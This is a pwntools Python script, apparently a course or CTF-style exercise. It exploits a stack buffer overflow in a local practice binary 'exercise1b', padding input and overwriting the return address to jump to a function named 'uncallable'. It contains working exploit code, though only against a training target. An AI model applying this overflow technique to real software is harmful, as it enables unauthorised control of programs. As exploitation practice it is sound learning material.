#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise1b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x401201
registers info
c
break *0x40120b
registers info
'''.format(**locals())
x = '''
break *0x4011b6
break *0x4011ba
break *0x4011c6
registers info

'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
#uncallable = b'\xb6\x11\x40\x00\x00\x00\x00\x00'
#uncallable = 0x004011b6
#previous = 0xffffde50
#rando = 0x00007fff
x = ELF(exe)
previous = 0x11
rando = 0x11
uncallable = hex(x.symbols['uncallable'])
print(uncallable)
uncallable = uncallable[2:]
print(uncallable)
uncallable = int(uncallable, 16)

r = start()
shellcode = b'A' * 160 + b'BBBBCCCCDDDDEEEE' + p32(previous) + p32(rando) + p32(uncallable)

r.recvuntil(b"password:\n")
r.sendline(shellcode)
x = r.recvall().decode().split("\n")[1]
print(x)

